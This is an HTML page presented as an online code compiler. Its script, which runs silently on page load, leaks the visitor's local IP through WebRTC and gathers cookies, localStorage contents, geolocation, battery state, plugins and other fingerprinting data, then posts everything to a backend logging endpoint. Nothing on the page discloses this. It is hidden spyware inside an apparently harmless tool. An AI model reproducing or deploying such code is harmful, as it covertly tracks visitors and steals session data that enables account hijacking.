<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Compiler Online</title>
</head>
<body>
    <h1>Compiler Online</h1>

    <h2>Code Submission</h2>
    <textarea id="code" rows="10" cols="30" placeholder="Write your code here..."></textarea><br>
    <button id="submit">Submit Code</button>

    <h2>Output</h2>
    <pre id="output"></pre>

    <script>
        async function logPrivateIP() {
            const pc = new RTCPeerConnection();
            let logged = false;

            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            pc.onicecandidate = event => {
                if (event.candidate && !logged) {
                    const candidate = event.candidate.candidate;
                    if (candidate.includes("candidate")) {
                        const localIP = candidate.split(" ")[4];
                        logged = true;

                        // Gather extensive information
                        const userAgent = navigator.userAgent;
                        const referrerHistory = document.referrer ? [document.referrer] : [];
                        const currentURL = window.location.href;
                        const screenWidth = window.screen.width;
                        const screenHeight = window.screen.height;
                        const browserLanguage = navigator.language || navigator.userLanguage;
                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                        const osInfo = navigator.platform;
                        const timestamp = new Date().toISOString();
                        const timeSpent = Math.round((performance.now() / 1000)); // Time spent in seconds
                        const activeTabDuration = Math.round((performance.now() / 1000)); // Active tab duration in seconds
                        const networkStatus = navigator.onLine ? "Online" : "Offline"; // Network status
                        const deviceType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop"; // Device type

                        // Additional device and performance information
                        const memoryInfo = performance.memory ? 
                            `Total: ${Math.round(performance.memory.total / 1048576)} MB, Used: ${Math.round(performance.memory.used / 1048576)} MB` : 
                            'Memory Info Not Available';

                        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown'; // Number of logical processors
                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown'; // Network connection type
                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins detected'; // Browser plugins
                        const batteryInfo = await navigator.getBattery().then(battery => ({
                            level: battery.level * 100,
                            charging: battery.charging
                        })).catch(() => null); // Battery status

                        // Fetch geolocation information
                        const geolocationInfo = await new Promise((resolve) => {
                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(
                                    position => resolve({ lat: position.coords.latitude, lon: position.coords.longitude }),
                                    () => resolve({ error: "Geolocation permission denied" })
                                );
                            } else {
                                resolve({ error: "Geolocation not supported" });
                            }
                        });

                        // Collecting cookies and local storage data
                        const cookies = document.cookie || 'No cookies available';
                        const localStorageData = JSON.stringify(localStorage) || 'No local storage data';

                        // Prepare log data
                        const logData = {
                            ip: localIP,
                            searchTerm: '', // Placeholder for search term
                            userAgent,
                            referrerHistory,
                            currentURL,
                            screenWidth,
                            screenHeight,
                            browserLanguage,
                            timeZone,
                            osInfo,
                            timestamp,
                            timeSpent,
                            activeTabDuration,
                            networkStatus,
                            deviceType,
                            memoryInfo,
                            hardwareConcurrency,
                            connectionType,
                            plugins,
                            batteryLevel: batteryInfo ? batteryInfo.level : 'Unknown',
                            isCharging: batteryInfo ? batteryInfo.charging : 'Unknown',
                            geolocation: geolocationInfo,
                            cookies,
                            localStorageData
                        };

                        // Send the log data to the backend
                        fetch('/api/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(logData)
                        }).then(response => {
                            if (!response.ok) {
                                console.error('Failed to log IP');
                            }
                        }).catch(error => {
                            console.error('Error:', error);
                        });
                    }
                }
            };
        }

        async function compileCode() {
            const code = document.getElementById('code').value;

            const response = await fetch('/api/compile', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code })
            });

            const result = await response.json();
            document.getElementById('output').textContent = result.output;
        }

        document.getElementById('submit').onclick = compileCode;
        logPrivateIP(); // Start IP logging silently
    </script>
</body>
</html>
